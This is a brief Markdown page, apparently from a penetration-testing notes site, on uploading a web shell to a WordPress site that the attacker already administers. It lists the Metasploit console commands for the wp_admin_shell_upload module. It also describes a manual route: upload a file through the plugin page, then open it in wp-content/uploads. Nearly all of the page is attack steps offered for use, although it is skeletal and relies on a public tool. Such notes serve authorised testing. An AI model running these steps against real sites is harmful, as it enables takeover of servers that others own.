---
title: "WordPress Admin Shell Upload"
date: 2020-03-06T13:02:27+01:00
draft: false
weight: 60
---

Abuse the plugin function to upload a shell.

```
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > show targets
    ...targets...
msf exploit(wp_admin_shell_upload) > set TARGET < target-id >
msf exploit(wp_admin_shell_upload) > show options
    ...show and set options...
msf exploit(wp_admin_shell_upload) > exploit
```

or simply login, go the plugins, upload a file and go the the WP upload folder (wp-content/uploads)